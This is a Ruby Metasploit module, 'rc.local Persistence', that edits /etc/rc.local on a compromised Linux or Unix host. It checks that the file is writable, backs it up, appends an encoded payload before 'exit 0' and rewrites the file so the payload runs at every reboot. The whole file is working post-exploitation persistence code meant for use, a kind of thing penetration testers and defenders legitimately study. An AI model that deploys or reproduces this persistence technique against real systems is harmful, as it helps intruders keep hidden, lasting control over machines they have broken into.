##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Exploit::Local::Persistence
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Deprecated
  moved_from 'exploits/linux/local/rc_local_persistence'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'rc.local Persistence',
        'Description' => %q{
          This module will edit /etc/rc.local in order to persist a payload.
          The payload will be executed on the next reboot.

          Verified on Ubuntu 12.04
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Eliott Teissonniere' ],
        'Platform' => [ 'unix', 'linux' ],
        'Arch' => ARCH_CMD,
        'Payload' => {
          'BadChars' => "#%\n",
          'Compat' => {
            'PayloadType' => 'cmd'
            # 'RequiredCmd' => 'generic python ruby netcat perl'
          }
        },
        'References' => [
          ['URL', 'https://attack.mitre.org/techniques/T1037/004/']
        ],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'DisclosureDate' => '1980-10-01', # The rc command appeared in 4.0BSD.
        'Targets' => [ ['Automatic', {}] ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION, EVENT_DEPENDENT],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        },
        'DefaultTarget' => 0
      )
    )

    deregister_options('WritableDir')
  end

  def check
    return CheckCode::Safe('/etc/rc.local does not exist') unless exists?('/etc/rc.local')
    return CheckCode::Safe('/etc/rc.local isnt writable') unless writable?('/etc/rc.local')

    CheckCode::Appears('/etc/rc.local is writable')
  end

  def exploit
    rc_path = '/etc/rc.local'

    print_status "Reading #{rc_path}"

    # read /etc/rc.local, but remove `exit 0`
    rc_local = read_file(rc_path).gsub(/^exit.*$/, '')

    backup_profile_path = store_loot('rc.local', 'text/plain', session, rc_local, 'rc.local', '/etc/rc.local backup')
    print_status("Created /etc/rc.local backup: #{backup_profile_path}")

    # add payload and put back `exit 0`
    rc_local << "\n#{payload.encoded}\nexit 0\n"

    # write new file
    print_status "Patching #{rc_path}"
    write_file(rc_path, rc_local)

    print_good('Payload will be triggered at next reboot')
  end
end
